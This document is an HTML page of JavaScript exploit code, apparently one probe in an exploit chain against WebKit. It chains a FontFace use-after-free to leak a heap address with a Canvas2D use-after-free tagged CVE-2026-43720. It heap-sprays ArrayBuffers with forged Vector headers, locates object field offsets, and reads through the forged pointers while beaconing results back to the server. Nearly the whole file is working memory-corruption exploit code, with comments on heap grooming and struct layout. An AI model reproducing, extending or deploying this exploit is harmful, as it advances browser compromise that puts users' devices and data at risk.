<!--
  p649: Canvas2D AB(768) forge — alive test + offset discovery

  Strategy:
    Phase 1: FontFace UAF → leak heap address T (+0x58 of 192B reclaim)
    Phase 2: Canvas2D UAF (CVE-2026-43720) → free 768B CanvasRenderingContext2D
    Phase 3: Spray AB(768) with repeating {T, 1|1} pattern every 16 bytes
             This makes EVERY 16B-aligned offset look like a valid Vector<State,1> header:
             m_buffer=T, m_capacity=1, m_size=1
    Phase 4: save() × 10 → increments m_unrealizedSaveCount (4B unsigned)
             save() is { ++m_unrealizedSaveCount } — no m_stateStack access, always safe
             Scan ABs for dword changed by exactly 10 → offset of m_unrealizedSaveCount
    Phase 5: Read lineWidth, getTransform etc → tests if m_stateStack forge worked
             The getter does: m_stateStack.last().lineWidth = *(T + lineWidth_offset_in_State)
             T points to freed 80B hash table (still readable heap memory)

  Key insight: save() ONLY touches m_unrealizedSaveCount, NOT m_stateStack.
  So the offset discovery works regardless of whether the {T,1|1} pattern
  aligns with m_stateStack. Even if lineWidth crashes, the save() offset
  is already beaconed.

  From WebKit source analysis (current main, similar to 605.1.15):
  - State.lineWidth at +0x30 within State (after 2 Strings + 2 CanvasStyle)
  - AffineTransform at State+0x58 (48B = 6 doubles)
  - m_stateStack starts at ~0x40-0x58 from struct start
  - State inline data at m_stateStack + 0x10 (Vector header)
  - m_unrealizedSaveCount after m_stateStack + FloatRect(16B)

  CRASH_CLASS: HIGH — dereferencing forged pointers through C++ getters
-->
<!DOCTYPE html><html><head><meta charset="utf-8"><title>p649</title></head>
<body>p649: Canvas2D AB forge alive test
<pre id="log" style="color:#0f0;background:#000;font:12px monospace;padding:8px;white-space:pre-wrap"></pre>
<script>
(function() {
'use strict';
var L = document.getElementById('log');
var bQ = [];
var retained = [];

function emit(tag, msg) {
  var s = tag + (msg ? ' ' + msg : '');
  L.textContent += s + '\n';
  bQ.push(s);
  if (bQ.length >= 3) flush();
}
function flush() {
  if (!bQ.length) return;
  var b = bQ.splice(0, 6).join('|');
  try { var x = new XMLHttpRequest(); x.open('GET', '/beacon/P649-' + encodeURIComponent(b), false); x.send(); } catch(e) {}
}
window.onerror = function(m) { emit('ERR', String(m).slice(0,120)); flush(); };

var f64 = new Float64Array(1);
var u8f = new Uint8Array(f64.buffer);
function d2hex(d) {
  f64[0] = d;
  var h = '';
  for (var i = 7; i >= 0; i--) h += ('0' + u8f[i].toString(16)).slice(-2);
  return h;
}
function hex32(v) { return ('00000000' + (v >>> 0).toString(16)).slice(-8); }

emit('START', navigator.userAgent ? navigator.userAgent.slice(0,60) : 'no-ua');
flush();

// ================================================================
// PHASE 1: FontFace UAF → leak heap address T
// ================================================================
var ffA = new FontFace('ff0', 'local(Helvetica)', { unicodeRange: 'U+0041' });
document.fonts.add(ffA);
void ffA.loaded;
retained.push(ffA);

var ffStyle = document.createElement('style');
ffStyle.textContent = "@font-face { font-family: ffs0; src: local(Arial); unicode-range: U+0042; }";
document.head.appendChild(ffStyle);

var ffFired = false;
var ffBufs = [];
Object.defineProperty(FontFace.prototype, 'then', {
  configurable: true,
  get: function() {
    if (ffFired) return undefined;
    ffFired = true;
    ffStyle.remove();
    try { document.fonts.delete(this); } catch(e) {}
    document.body.offsetHeight;
    for (var i = 0; i < 64; i++) {
      var ab = new ArrayBuffer(192);
      ffBufs.push(new Uint8Array(ab));
    }
    return undefined;
  },
  set: function() {}
});

document.fonts.load('1em ff0, ffs0', 'AB');

setTimeout(function() {
try {
  var T_lo = 0, T_hi = 0, W_lo = 0, W_hi = 0;
  var ffHit = -1;

  for (var i = 0; i < ffBufs.length; i++) {
    var v = ffBufs[i];
    var nonzero = 0;
    for (var j = 0; j < 192; j++) if (v[j] !== 0) nonzero++;
    if (nonzero > 0) {
      ffHit = i;
      var dv = new DataView(v.buffer);
      T_lo = dv.getUint32(0x58, true);
      T_hi = dv.getUint32(0x5C, true);
      W_lo = dv.getUint32(0x68, true);
      W_hi = dv.getUint32(0x6C, true);
      emit('FF-HIT', 'buf[' + i + '] nz=' + nonzero);
      emit('FF-T', '0x' + hex32(T_hi) + hex32(T_lo));
      emit('FF-W', '0x' + hex32(W_hi) + hex32(W_lo));
      break;
    }
  }

  if (ffHit < 0) {
    emit('FF-MISS', 'no FontFace reclaim — using T=0 (save-only mode)');
    // Continue anyway: save() discovery doesn't need T
  }
  flush();

  // ================================================================
  // PHASE 2: Canvas2D UAF (CVE-2026-43720)
  // ================================================================
  var uafCanvas = document.createElement('canvas');
  uafCanvas.width = 1; uafCanvas.height = 1;
  document.body.appendChild(uafCanvas);

  var innerCtx = null;
  var gFired = false;
  var cvOpts = {};
  Object.defineProperty(cvOpts, 'alpha', {
    get: function() {
      gFired = true;
      innerCtx = uafCanvas.getContext('2d');
      return true;
    }
  });

  try { uafCanvas.getContext('bitmaprenderer', cvOpts); } catch(e) {}

  emit('CV-UAF', 'getter=' + gFired + ' inner=' + !!innerCtx);
  flush();
  if (!innerCtx) { emit('ABORT', 'no inner ctx'); flush(); return; }

  // ================================================================
  // PHASE 3: AB(768) spray with {T, 1|1} pattern every 16B
  // If T=0 (FontFace miss), pattern is {0, 1|1} — save() still works
  // ================================================================
  var AB_N = 300;
  var abViews = [];
  var abDVs = [];

  var tmpl = new ArrayBuffer(768);
  var tmplU8 = new Uint8Array(tmpl);
  var tmplDV = new DataView(tmpl);
  for (var off = 0; off < 768; off += 16) {
    tmplDV.setUint32(off + 0, T_lo, true);
    tmplDV.setUint32(off + 4, T_hi, true);
    tmplDV.setUint32(off + 8, 1, true);   // m_capacity
    tmplDV.setUint32(off + 12, 1, true);   // m_size
  }

  for (var i = 0; i < AB_N; i++) {
    var ab = new ArrayBuffer(768);
    var view = new Uint8Array(ab);
    view.set(tmplU8);
    abViews.push(view);
    abDVs.push(new DataView(ab));
    retained.push(ab);
  }

  emit('SPRAY', AB_N + ' AB(768) with {T,1|1} x' + (768/16));
  flush();

  // ================================================================
  // PHASE 4: save() × N — find m_unrealizedSaveCount offset
  // save() is { ++m_unrealizedSaveCount } — no m_stateStack access
  // ================================================================
  var SAVE_N = 10;
  for (var si = 0; si < SAVE_N; si++) {
    innerCtx.save();
  }

  emit('SAVE', 'called save() x' + SAVE_N);

  // Scan all ABs for a dword that changed by exactly SAVE_N
  var hitAB = -1;
  var hitOff = -1;
  var otherDiffs = 0;

  for (var ai = 0; ai < abViews.length; ai++) {
    var foundInThis = false;
    for (var off = 0; off < 768; off += 4) {
      var orig = tmplDV.getUint32(off, true);
      var curr = abDVs[ai].getUint32(off, true);
      if (curr !== orig) {
        var delta = (curr - orig) | 0;
        if (delta === SAVE_N && hitAB < 0) {
          hitAB = ai;
          hitOff = off;
          emit('SAVE-HIT', 'AB[' + ai + ']+0x' + off.toString(16) +
            ' orig=0x' + hex32(orig) + ' now=0x' + hex32(curr));
          foundInThis = true;
        } else {
          otherDiffs++;
          if (otherDiffs <= 5) {
            emit('SAVE-DIFF', 'AB[' + ai + ']+0x' + off.toString(16) +
              ' orig=0x' + hex32(orig) + ' now=0x' + hex32(curr) + ' d=' + delta);
          }
        }
      }
    }
    if (foundInThis) break;
  }

  if (hitAB < 0) {
    emit('SAVE-MISS', 'no +10 dword found (otherDiffs=' + otherDiffs + ')');
  } else {
    emit('SAVE-OK', 'm_unrealizedSaveCount at +0x' + hitOff.toString(16) +
      ' in AB[' + hitAB + '] (otherDiffs=' + otherDiffs + ')');
  }
  flush();

  // ================================================================
  // PHASE 5: Try reading properties (might crash if m_stateStack misaligned)
  // Beacon BEFORE each read so crash location is identifiable
  // ================================================================
  emit('READ', 'attempting lineWidth...');
  flush();

  var readOk = false;
  try {
    var lw = innerCtx.lineWidth;
    readOk = true;
    emit('READ-LW', lw + ' hex=' + d2hex(lw));
  } catch(e) {
    emit('READ-LW', 'EXCEPTION: ' + String(e).slice(0,60));
  }
  flush();

  if (readOk) {
    try {
      emit('READ-ML', innerCtx.miterLimit + ' hex=' + d2hex(innerCtx.miterLimit));
    } catch(e) { emit('READ-ML', 'CRASH'); }

    try {
      emit('READ-GA', innerCtx.globalAlpha + ' hex=' + d2hex(innerCtx.globalAlpha));
    } catch(e) { emit('READ-GA', 'CRASH'); }

    try {
      var t = innerCtx.getTransform();
      emit('XF-A', 'a=' + d2hex(t.a) + ' b=' + d2hex(t.b));
      emit('XF-B', 'c=' + d2hex(t.c) + ' d=' + d2hex(t.d));
      emit('XF-C', 'e=' + d2hex(t.e) + ' f=' + d2hex(t.f));
    } catch(e) { emit('READ-XF', 'CRASH: ' + String(e).slice(0,60)); }

    try {
      emit('READ-SB', 'shadowBlur=' + innerCtx.shadowBlur);
    } catch(e) { emit('READ-SB', 'CRASH'); }

    try {
      emit('READ-SO', 'X=' + innerCtx.shadowOffsetX + ' Y=' + innerCtx.shadowOffsetY);
    } catch(e) { emit('READ-SO', 'CRASH'); }

    try {
      emit('READ-LDO', 'lineDashOffset=' + innerCtx.lineDashOffset);
    } catch(e) { emit('READ-LDO', 'CRASH'); }
    flush();
  }

  // ================================================================
  // PHASE 6: Dump interesting offsets of the hit AB
  // ================================================================
  if (hitAB >= 0) {
    var hv = abViews[hitAB];
    var hdv = abDVs[hitAB];

    // Dump regions around the hit offset and likely m_stateStack locations
    var regions = [];
    // Around m_unrealizedSaveCount
    if (hitOff >= 32) regions.push(hitOff - 32);
    regions.push(hitOff);
    if (hitOff + 32 < 768) regions.push(hitOff + 32);
    // Likely m_stateStack locations (0x30-0x60)
    regions.push(0x30);
    regions.push(0x40);
    regions.push(0x50);
    // Start of struct
    regions.push(0x00);

    for (var ri = 0; ri < regions.length; ri++) {
      var base = regions[ri];
      base = base - (base % 16); // align to 16
      if (base < 0) base = 0;
      var hex = '';
      for (var j = 0; j < 32 && base + j < 768; j++) {
        hex += ('0' + hv[base + j].toString(16)).slice(-2);
      }
      var mark = '';
      if (base <= hitOff && hitOff < base + 32) mark = ' <-- saveCount+0x' + hitOff.toString(16);
      emit('DUMP', '+0x' + ('000' + base.toString(16)).slice(-3) + ': ' + hex + mark);
    }
    flush();

    // Also scan for OTHER diffs (non-template bytes)
    var allDiffs = [];
    for (var off = 0; off < 768; off++) {
      if (hv[off] !== tmplU8[off]) {
        allDiffs.push(off);
      }
    }
    emit('DIFF-SUMMARY', allDiffs.length + ' changed bytes total at offsets: ' +
      allDiffs.slice(0, 16).map(function(o) { return '0x'+o.toString(16); }).join(',') +
      (allDiffs.length > 16 ? '...' : ''));
    flush();
  }

  // ================================================================
  // PHASE 7: Layout analysis
  // ================================================================
  if (hitOff >= 0) {
    // From source: m_stateStack, then m_dirtyRect(16B), then m_unrealizedSaveCount
    // So: m_stateStack_end = hitOff - 16 (FloatRect) - possible_padding
    // And: inline State starts at m_stateStack + 0x10 (Vector header)
    // m_stateStack start: we can search backward from hitOff for the Vector header
    // The Vector header has m_buffer=T at its start. Find the LAST occurrence of T
    // before hitOff - that's likely m_stateStack start.

    var possibleStackStart = -1;
    for (var off = hitOff - 32; off >= 0; off -= 8) {
      var lo = hdv.getUint32(off, true);
      var hi = hdv.getUint32(off + 4, true);
      if (lo === T_lo && hi === T_hi) {
        // Check if the next 8 bytes are {1, 1}
        if (off + 8 < 768) {
          var cap = hdv.getUint32(off + 8, true);
          var sz = hdv.getUint32(off + 12, true);
          // Could be the Vector header... but ALL 16B-aligned offsets match
          // The REAL m_stateStack.m_buffer would actually point to the INLINE buffer
          // (self-referencing), not to T. With our forge, it's T.
          // The correct one is the one closest before hitOff
          possibleStackStart = off;
          // Don't break — keep searching to find the one closest before hitOff
        }
      }
    }

    // Actually: m_unrealizedSaveCount = hitOff
    // m_dirtyRect = 16B before that → hitOff - 16
    // m_stateStack ends at hitOff - 16 - possible_padding
    // The Vector<State,1> ends where m_dirtyRect starts
    // Vector header (16B) + inline State = Vector size
    // m_stateStack starts at some offset S, Vector header at S..S+15
    // Inline State at S+16..S+16+sizeof(State)-1
    // m_dirtyRect at S + sizeof(Vector) = hitOff - 16

    var dirtyRectOff = hitOff - 16;
    // If there's padding between m_dirtyRect and m_unrealizedSaveCount, dirtyRectOff might be hitOff-20
    // But FloatRect is 16B and m_unrealizedSaveCount is 4B, no padding needed between 4B-aligned and 4B

    emit('LAYOUT', 'm_unrealizedSaveCount: +0x' + hitOff.toString(16));
    emit('LAYOUT', 'm_dirtyRect (est): +0x' + dirtyRectOff.toString(16) + ' (16B)');

    // m_stateStack: need to search backward from dirtyRectOff
    // The last T-pattern before dirtyRectOff should be near the Vector header
    // But with the {T,1|1} fill, every 16B has T. The real question is: where does the
    // inline State buffer END?
    // Answer: at dirtyRectOff. So the inline State buffer = [S+16, dirtyRectOff)
    // And the Vector header = [S, S+16)
    // sizeof(State) = dirtyRectOff - (S + 16)
    // Total Vector<State,1> = dirtyRectOff - S = 16 + sizeof(State)

    // From source analysis, m_buffer/m_bufferNativeImage (2×8B = 16B) come before m_stateStack
    // And the CanvasRenderingContext base is ~48B
    // So m_stateStack starts at ~0x40 (base ~0x30 + 2 RefPtrs)
    // Let's compute: stateStackEnd = dirtyRectOff = hitOff - 16
    // stateStackStart = stateStackEnd - 16 - sizeof(State)
    // We need sizeof(State), which we're trying to discover...

    // Instead: just report the key offsets and let the next probe refine
    // The inline State starts at m_stateStack + 0x10
    // If m_stateStack is at 0x40: lineWidth = 0x40 + 0x10 + 0x30 = 0x80
    // If m_stateStack is at 0x50: lineWidth = 0x50 + 0x10 + 0x30 = 0x90
    emit('LAYOUT', 'est lineWidth: +0x80 (if stack@0x40) or +0x90 (if stack@0x50)');
    emit('LAYOUT', 'est transform.a: +0xA8 (if stack@0x40) or +0xB8 (if stack@0x50)');
    flush();
  }

  emit('ALIVE', readOk ? 'FORGE WORKS — reads survived' : 'save-only (read crashed or skipped)');
  flush();

  window.__p649 = { retained: retained, innerCtx: innerCtx, hitAB: hitAB, hitOff: hitOff };

} catch(topErr) { emit('FATAL', String(topErr).slice(0,200)); flush(); }
}, 250);
})();
